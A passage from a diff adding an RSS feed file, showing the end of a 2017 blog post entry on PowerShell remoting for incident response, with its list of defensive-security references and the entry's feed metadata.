+&lt;p&gt;The above should provide a some food for thought and point you in the right direction for further research. Feel free to reach out if you have any questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;references--further-reading&quot;&gt;References / Further reading:&lt;/h2&gt;
+&lt;p&gt;1) Atkinson, &lt;a href=&quot;http://www.invoke-ir.com&quot;&gt;Jared. Invoke-IR&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Australian Signals Directorate. &lt;a href=&quot;http://www.asd.gov.au/publications/protect/Securing_PowerShell.pdf&quot;&gt;Securing PowerShell in the Enterprise&lt;/a&gt;, 2016&lt;/p&gt;
+
+&lt;p&gt;3) Hofferle, Jason. &lt;a href=&quot;https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/23/an-introduction-to-powershell-remoting-part-one/&quot;&gt;Hey Scripting Guy! An Introduction to PowerShell Remoting: Part One&lt;/a&gt;, 2012&lt;/p&gt;
+
+&lt;p&gt;4) Hull, Dave. &lt;a href=&quot;http://www.powershellmagazine.com/2014/07/18/kansa-a-powershell-based-incident-response-framework/&quot;&gt;PowerShell Magazine. Kansa overview &lt;/a&gt;, 2014&lt;/p&gt;
+
+&lt;p&gt;5) Kazanciyan, Ryan. Hastings, Matt. &lt;a href=&quot;https://www.blackhat.com/docs/us-14/materials/us-14-Kazanciyan-Investigating-Powershell-Attacks-WP.pdf&quot;&gt;Investigating Powershell Attacks&lt;/a&gt;, 2014&lt;/p&gt;
+
+&lt;p&gt;6) Metcalf, Sean. &lt;a href=&quot;https://adsecurity.org/wp-content/uploads/2015/01/&quot;&gt;PowerShell Security: Defending the Enterprise from the Latest Attack Platform&lt;/a&gt;, 2016. &lt;/p&gt;
+
+&lt;p&gt;7) MSDN. &lt;a href=&quot;https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/&quot;&gt;PowerShell for the Blue Team&lt;/a&gt;, 2015&lt;/p&gt;
+
+&lt;p&gt;8) MSDN. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa384426(v=vs.85).aspx&quot;&gt;Windows Remote Management&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;9) Upguard. &lt;a href=&quot;https://support.upguard.com/upguard/winrm-configuration.html#enabling-https-winrm&quot;&gt;WinRM Configuration: Enabling HTTPS WinRM&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 12 Jan 2017 00:00:00 +1100</pubDate>
+        <link>https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>Powershell</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+  </channel>
+</rss>
